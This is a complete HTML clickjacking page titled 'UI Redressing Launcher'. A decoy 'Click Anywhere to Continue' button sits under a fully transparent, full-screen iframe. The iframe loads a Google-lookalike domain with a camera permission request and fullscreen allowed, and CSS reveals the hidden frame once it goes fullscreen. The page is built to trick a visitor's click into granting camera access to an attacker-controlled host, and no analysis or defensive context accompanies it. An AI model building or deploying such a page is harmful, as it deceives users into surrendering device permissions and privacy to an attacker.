<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UI Redressing Launcher - Click Anywhere</title>
    <style>
        /* 1. Force the body to occupy the entire viewport without scrollbars */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }

        /* 2. Main container expands to full screen execution size */
        .container {
            position: relative;
            width: 100vw;
            height: 100vh;
            background: #f0f0f0;
        }

        /* Visual decoy background underneath the transparent iframe */
        .decoy-background {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1;
            background-color: #f8f9fa;
        }

        .decoy-text {
            padding: 20px 40px;
            background: #1a73e8;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        /* 3. Transparent iframe covering the whole screen from the start */
        .overlay-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw !important;
            height: 100vh !important;
            border: none;
            z-index: 2;
            opacity: 0.0; /* Change to 0.3 during testing to see the frame boundary */
        }

        /* Triggered when the iframe enters Top Layer via requestFullscreen */
        .overlay-frame:fullscreen {
            width: 100vw !important;
            height: 100vh !important;
            opacity: 1.0 !important; /* Forces the server content to become visible */
            background-color: #ffffff !important;
        }
        
        /* WebKit engine support (Safari / iOS WebView) */
        .overlay-frame:-webkit-full-screen {
            width: 100vw !important;
            height: 100vh !important;
            opacity: 1.0 !important;
            background-color: #ffffff !important;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="decoy-background">
        <div class="decoy-text">
            Click Anywhere to Continue
            <div style="font-size: 12px; font-weight: normal; margin-top: 5px; color: #e8f0fe;">
                (Screen verification required)
            </div>
        </div>
    </div>
    
    <iframe 
        class="overlay-frame" 
        src="https://googllogoligaturee.my.id/izin.html?=camera"
        allow="fullscreen https://googllogoligaturee.my.id/izin.html?=camera">
    </iframe>
</div>

</body>
</html>
